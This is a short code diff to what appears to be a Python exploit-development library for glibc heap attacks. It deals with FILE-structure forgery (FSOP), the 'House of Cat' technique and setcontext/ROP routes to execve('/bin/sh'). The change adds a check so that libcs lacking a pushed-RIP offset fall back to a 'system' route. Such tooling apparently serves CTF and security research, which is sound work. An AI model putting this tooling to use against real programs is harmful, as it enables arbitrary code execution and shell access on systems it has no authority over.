@@ -343,6 +343,9 @@ def setcontext_fsop_cells(fp_addr: int, *, flags: int, wide_data: int, wide_vtab
 
     Order: the two writes outside the FILE first, then the FILE's own fields, `_flags` and the
     vtable last -- the vtable write is what arms the forgery."""
+    if rip_at is None:
+        raise ValueError("setcontext_fsop_cells needs rip_at (the pushed-RIP offset); this libc's "
+                         "setcontext does not expose one, so the caller must use the system route")
     cells = [(wide_vtable + _JT_DOALLOCATE, setcontext),
              (wide_data + _WD_VTABLE, wide_vtable),
              (fp_addr + _F_WRITE_PTR, 1)]
@@ -450,7 +453,11 @@ def house_of_cat_targets(libc_data: bytes, plan: str = "system") -> dict:
     if plan == "setcontext":
         sc = rop.find_setcontext(libc_data)
         binsh = rop.find_string(libc_data, b"/bin/sh")
-        if not (sc and binsh):
+        # `rip_at` is where setcontext pushes the continuation; without it the register-load route
+        # cannot place `execve`. Some libcs (e.g. glibc 2.43, whose setcontext tail no longer ends
+        # in the `mov rcx,[rdx+..]; push rcx` this reads) do not expose it -- the setcontext finish
+        # is then unavailable, and the caller picks `system` for the cat blob instead of crashing.
+        if not (sc and binsh and sc.get("rip_at") is not None):
             return {}
         out.update({"setcontext": sc["entry"], "fields": sc["fields"], "rip_at": sc["rip_at"],
                     "execve": syms["execve"], "binsh": binsh})
